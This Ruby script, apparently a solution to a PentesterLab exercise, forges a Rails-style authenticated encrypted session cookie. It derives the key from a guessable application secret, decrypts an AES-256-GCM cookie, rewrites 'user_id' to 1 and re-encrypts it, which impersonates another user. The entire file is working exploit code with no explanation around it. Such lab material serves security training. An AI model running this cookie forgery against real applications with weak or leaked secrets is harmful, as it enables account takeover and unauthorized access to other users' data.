require 'uri'
require 'openssl'
require 'base64'
require 'json'

cookie = URI.decode "I97HcG3V%2F40754RU%2BPkaIkPAwaFKvDnc%2B6LH3Cmdfu3LBwTpsx%2BWF%2FILolrW4MNvzvF6soF0XqVkVYJABFe0InlIj74hpSDQQ1Ry3bzB1NIydv%2BmFdewiRLkU3VYfPQPCgUcI98fleA4Wd8xTu%2B9nXc5wFAl1%2FTTJBA%3D--zXN1u1YLdarXBBbj--evy%2BEjoXearAuaBiojvhJQ%3D%3D"

def secret
	secret = Digest::MD5.hexdigest("PentesterLab::Application")
	OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end

cipher = OpenSSL::Cipher.new("aes-256-gcm")

encrypted_data, iv, auth_tag = cookie.split("--").map { |v| ::Base64.strict_decode64(v) }
cipher.decrypt
cipher.key = secret
cipher.iv  = iv

cipher.auth_tag = auth_tag
cipher.auth_data = ""

decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final

puts decrypted_data

data = JSON.parse decrypted_data
data['user_id'] = 1

puts data

cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data = cipher.update(data.to_json)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts URI.escape(blob, "+=/")